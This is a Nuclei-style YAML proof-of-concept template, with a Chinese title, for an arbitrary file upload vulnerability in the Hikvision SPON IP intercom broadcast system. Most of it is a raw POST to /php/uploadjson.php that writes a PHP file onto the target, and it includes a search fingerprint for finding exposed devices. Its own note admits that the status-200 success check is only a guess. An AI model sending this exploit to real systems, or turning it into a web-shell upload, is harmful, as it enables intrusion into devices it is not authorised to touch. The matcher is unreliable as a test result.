id: poc-3593c4c6a6ea9296405d
info:
  name: 海康威视SPONIP网络对讲广播系统uploadjson存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3593c4c6a6ea9296405d7af45e53a035

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 3593c4c6a6ea9296405d7af45e53a035
    fofa: + Hunter：`web.body="vendors/custom/html5.min.js"`
http:
- raw:
  - 'POST /php/uploadjson.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Connection: close

    Upgrade-Insecure-Requests: 1

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 60


    jsondata[filename]=111.php&jsondata[data]=<?php phpinfo();?>'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
